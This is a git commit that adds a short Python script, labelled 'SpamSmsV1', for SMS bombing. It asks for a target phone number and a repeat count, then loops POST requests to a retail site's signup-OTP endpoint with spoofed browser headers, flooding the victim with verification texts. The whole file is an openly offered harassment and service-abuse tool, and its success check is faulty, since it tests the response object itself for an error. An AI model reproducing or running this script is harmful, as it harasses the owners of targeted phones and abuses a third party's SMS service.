b311933d5972c578d5fce941d3a19c6a9c729e7a
Ahmadripai04 <85654367+Ahmadripai04@users.noreply.github.com>
2021-06-23 06:15:32 +0700

    Add files via upload

---
+++ spam.py
@@ -0,0 +1,42 @@
+import json
+import requests
+import os
+import sys
+
+
+def main():
+	os.system('clear')
+	os.system('figlet Spam Sms')
+	banner = '''
+	===========================
+	Author: Aing_Arip
+
+	YouTube: Aing Arip
+
+	script:SpamSmsV1
+	===========================
+	'''
+
+	print(banner)
+	no = input('Target : ')
+	jum = input('Jumlah Spam : ')
+
+	head = {
+	"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
+	"Referer": "https://www.mapclub.com/en/user/signup",
+	"Host": "cmsapi.mapclub.com",
+	}
+
+
+	dat = {
+	'phone': no
+	}
+
+	for x in range(int(jum)):
+		leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
+		if 'error' in leosureo:
+			print(' Gagal Mengirim '+ no)
+		else:
+			print('Succes Mengirim '+ no)
+
+main()
